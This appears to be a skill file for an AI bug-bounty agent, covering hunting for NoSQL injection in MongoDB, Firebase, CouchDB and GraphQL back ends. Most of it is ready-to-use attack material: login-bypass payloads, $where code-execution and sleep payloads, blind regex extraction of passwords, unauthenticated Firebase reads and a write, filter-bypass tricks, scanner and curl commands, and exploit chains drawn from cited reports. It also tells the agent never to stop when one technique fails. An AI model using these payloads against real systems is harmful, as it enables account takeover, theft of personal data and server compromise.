---
name: hunt-nosql
description: "Use this skill when the target uses MongoDB, CouchDB, Firebase, DynamoDB, RethinkDB, or any document/key-value DB; when JSON body parameters contain user-supplied filters; when you see params like $where, $gt, $ne, $regex; when login accepts JSON body (Content-Type: application/json); or when URL params take object syntax (user[$ne]=x). Load automatically when fingerprint shows Express/Node + MongoDB, Meteor, Parse, or Firebase. Only invoke if real impact potential — auth bypass, mass data extraction, or RCE. Skip theoretical findings."
type: hunt
---

# Hunt: NoSQL Injection

## Crown Jewel Targets
- **Auth bypass via `$ne` / `$gt` on login** — `{"username":"admin","password":{"$ne":null}}` → admin session, Critical
- **$where JavaScript injection on MongoDB** — full RCE / arbitrary JS execution server-side (Critical, pays $5k+)
- **$regex blind extraction** of password hashes / 2FA secrets / API keys (High)
- **Firebase rule bypass** — read/write entire `users/` collection unauthenticated (Critical for PII)
- **GraphQL → NoSQL operator injection** — `where: {email: {_eq: $userInput}}` with `{_gt: ""}` to bypass
- **NoSQL injection in password reset** — `{email:{$ne:null}}` → leaks reset token for arbitrary user
- **Aggregation pipeline injection** — `$lookup` / `$out` for SSRF and data exfil

## Detection Signals
- Headers / banners: `X-Powered-By: Express`, `MongoDB` in stack traces, `BSON` error messages
- Errors: `CastError`, `MongoError: E11000`, `Cannot read property of undefined`, `ObjectId failed`, `$where`, `cannot index parallel arrays`
- Request bodies: `Content-Type: application/json` on auth/search endpoints
- URL param syntax: `?user[$ne]=x` accepted (Express qs parser converts to object)
- DB-as-a-Service URLs in JS bundles: `*.firebaseio.com`, `*.cloudfront.net/parse`, `couchdb.target.com`, MongoDB Atlas connection strings
- GraphQL filter args: `where: {_eq, _gt, _in, _like, _regex}` patterns (Hasura), `where: {AND, OR}` (Prisma)

## Attack Techniques
1. **Auth bypass with operator injection (JSON)** — login endpoint expects `{"user":"x","pass":"y"}`. Send `{"user":"admin","pass":{"$ne":""}}` → password check returns true for any non-empty value.
2. **Auth bypass via URL operator syntax** — Express `qs` parser turns `?user[$ne]=null&pass[$ne]=null` into object. Many APIs vulnerable.
3. **$regex blind extraction** — `{"user":"admin","pass":{"$regex":"^a"}}` succeeds if password starts with 'a'. Char-by-char extract entire hash.
4. **$where JS execution** — `{"$where":"this.username == 'admin' && sleep(5000)"}` — runs arbitrary JS inside Mongo `Function()` sandbox. Can use `Object.keys`, `String.fromCharCode`, even `eval` in old Mongo. RCE via gadget chains.
5. **Array operator URL injection** — `username[$ne]=foo&password[$ne]=foo` for GET-based login.
6. **Boolean blind injection** — `?id[$gt]=` vs `?id[$lt]=` to extract values comparison-by-comparison.
7. **Time-based blind** — `{"$where":"sleep(5000)"}` or `{"$where":"function(){var d=new Date();while(new Date()-d<5000);return true}()"}`.
8. **$or / $and stacking** — `{"$or":[{"a":1},{"b":1}]}` to bypass filtered keys.
9. **$lookup for cross-collection exfil** — aggregation pipeline pulls data from arbitrary collections.
10. **CouchDB Erlang injection** — `_design/lookup/_view/by_user?key="x"||true` (CouchDB-specific).
11. **Firebase rule bypass** — `.read: "auth != null"` but app sends no auth check — direct REST `GET https://app.firebaseio.com/users.json` returns all.
12. **MongoDB SSRF via $out / $merge** — pipeline writes to external collection / triggers DNS lookup.

## Payloads
**Auth bypass (JSON body):**
```json
{"username":"admin","password":{"$ne":null}}
{"username":"admin","password":{"$ne":""}}
{"username":"admin","password":{"$gt":""}}
{"username":{"$ne":null},"password":{"$ne":null}}
{"username":{"$regex":"^adm"},"password":{"$ne":null}}
{"username":{"$in":["admin","root","administrator"]},"password":{"$ne":null}}
```

**Auth bypass (URL):**
```
username[$ne]=foo&password[$ne]=foo
username[$regex]=.*&password[$ne]=
username[$exists]=true&password[$ne]=
username=admin&password[$regex]=^a
```

**$where RCE / DoS:**
```json
{"$where":"this.username=='admin'"}
{"$where":"sleep(5000)"}
{"$where":"function(){var d=new Date();do{cd=new Date();}while(cd-d<5000);return true;}()"}
{"$where":"this.password.match(/^a/)||sleep(5000)"}
```

**$regex char-by-char extraction:**
```
{"username":"admin","password":{"$regex":"^a"}}
{"username":"admin","password":{"$regex":"^aa"}}
{"username":"admin","password":{"$regex":"^[a-f0-9]{32}$"}}
```

**Firebase unauth REST:**
```
GET https://target.firebaseio.com/.json
GET https://target.firebaseio.com/users.json
GET https://target.firebaseio.com/users.json?orderBy="$key"&limitToFirst=100
PUT https://target.firebaseio.com/pwn.json -d '"hacked"'
```

**GraphQL Hasura operator injection:**
```graphql
query { users(where: {email: {_gt: ""}}) { id email password_hash } }
query { users(where: {email: {_like: "%@admin%"}}) { id role } }
```

## Bypass Methods
| Filter | Bypass |
|--------|--------|
| Strips `$` | URL-encode: `%24ne`, double-encode `%2524ne`, unicode `$ne` |
| Removes `.` in keys | Use bracket array syntax `user[$ne]` |
| Whitelist of keys | Use prototype pollution to inject `__proto__.$ne` |
| Body must be `x-www-form-urlencoded` | `user[$ne]=null&pass[$ne]=null` works in form encoding too |
| Sanitizes top-level keys only | Nest deeper: `{"filter":{"user":{"$ne":null}}}` |
| Mongo Server-Side JS disabled | $where unavailable — pivot to $regex / $accumulator |
| Type coerced to string | $regex still works on stringified objects |
| Length-limited input | $regex with short patterns: `{"$regex":"."}` |

## Tools
```bash
# NoSQLMap
python nosqlmap.py
# Set target, auth, body, run "NoSQL injection check"

# nosqli (Go)
nosqli scan -t "https://target.com/login" -r request.txt

# Manual auth-bypass probe
curl -X POST https://target.com/api/login \
  -H 'Content-Type: application/json' \
  -d '{"user":"admin","password":{"$ne":null}}'

# Firebase recon
curl https://target.firebaseio.com/.json
curl https://target.firebaseio.com/users.json

# ffuf with NoSQL wordlist
ffuf -u 'https://target.com/api/users?id=FUZZ' -w nosql-payloads.txt -mr '"admin"|"root"'

# Burp Intruder — load NoSQL payloads from PayloadsAllTheThings
```

## Impact
- **Critical**: Auth bypass (admin login), $where RCE, mass user extraction via $regex, public Firebase with PII
- **High**: Single-user data extraction, password hash leak via blind regex, IDOR enabled by NoSQL operator
- **Medium**: DoS via $where sleep, $regex DoS (ReDoS)

## Chain Potential
- **+ IDOR** = NoSQL `$ne` bypasses object-ID validation, exposing other users' data
- **+ Auth bypass** → ATO immediately
- **+ SSRF** = MongoDB `$lookup` to external URI (rare but possible in older configs)
- **+ Privilege escalation** = `{"role":"admin"}` via mass-assignment combined with operator injection
- **+ JWT** = NoSQL injection leaks JWT signing secret stored in DB
- **+ Password reset** = `{"email":{"$ne":null}}` returns first user's reset token
- **+ GraphQL** = operator injection in `where:` clause exposes entire dataset
- **+ Prototype pollution** = inject `__proto__.$ne = null` to pollute all queries

## Fallback Chain
1. If JSON body operator injection fails, try URL array syntax `param[$ne]=x` — Express qs parser silently converts.
2. If `$ne` blocked, try `$gt`, `$gte`, `$regex`, `$exists`, `$in`, `$where` — each may have separate filter logic.
3. If MongoDB rejects, fingerprint exact DB (CouchDB, Firebase, DynamoDB, RethinkDB) — payloads differ. Check for Firebase REST URLs in JS bundles.
4. Pivot to $where for code-execution attempt, or $lookup/$out for data-exfil pipelines, or GraphQL filter args with `_eq`/`_gt`. Never stop because one technique failed.

## Real-World Reports (from Community Writeups)

Limited public reports — NoSQL is under-reported relative to SQLi. The strongest case studies:

| Title | Program | Bounty | Source |
|---|---|---|---|
| Pre-Auth Blind NoSQL Injection → RCE | Rocket.Chat | $0 (Critical) | H1 #1130721 |
| Post-Auth Blind NoSQL Injection in users.list → RCE | Rocket.Chat | $0 (Critical) | H1 #1130874 |
| NoSQLi leaks visitor token and livechat messages | Rocket.Chat | $0 | H1 #2580062 |
| NoSQLi in listEmojiCustom method call | Rocket.Chat | $0 | H1 #1757676 |
| NoSQLi discloses S3 File Upload URLs | Rocket.Chat | $0 | H1 #1458020 |
| MongoDB Query Logs & Schema Leak via unauth endpoint | Bykea | $0 | H1 #3249406 |
| Customer + admin email enumeration via Mongo injection | express-cart (Node) | $0 | H1 #397445 |
| ATO via blind MongoDB injection in password reset | flintcms (Node) | $0 | H1 #386807 |
| MongoDB credentials leaked in GitHub | Sifchain | $0 | H1 #1183809 |

**PROVEN techniques** (3+ reports):
- **Blind MongoDB operator injection (`$ne`, `$regex`, `$gt`) on auth / lookup endpoints** (Rocket.Chat suite, flintcms, express-cart) — bypass login and enumerate users char by char.
- **`$where` server-side JS injection → RCE** (Rocket.Chat #1130721, #1130874) — auth bypass via Mongo operator escalates to code execution through `$where` evaluating attacker JS.
- **Method-call NoSQLi (Meteor / DDP-style)** (Rocket.Chat listEmojiCustom, users.list) — Meteor's method calls accept raw selectors from client.

## High-Value Chains (from Reports)

- **NoSQLi → RCE via `$where`** — Rocket.Chat (H1 #1130721, pre-auth): Mongo `$where` operator executed attacker-controlled JS server-side. Pre-auth path → full RCE.
- **NoSQLi auth bypass → password-reset takeover** — flintcms (H1 #386807): `$ne` / `$regex` on reset token field enumerated valid tokens, leading to ATO without ever seeing the email.
- **NoSQLi → mass enumeration → PII exfil** — express-cart (H1 #397445): customer/admin emails extracted one bit at a time via `$regex` boolean blind.
- **Unauth Mongo schema leak → targeted query injection** — Bykea (H1 #3249406): an unauthenticated endpoint returned full query logs / schema, providing the field/collection names attackers needed to weaponize further injection.
- **NoSQLi → S3 URL disclosure → upload pivot** — Rocket.Chat (H1 #1458020): NoSQLi exposed signed S3 URLs that gave access to uploaded files cross-tenant.
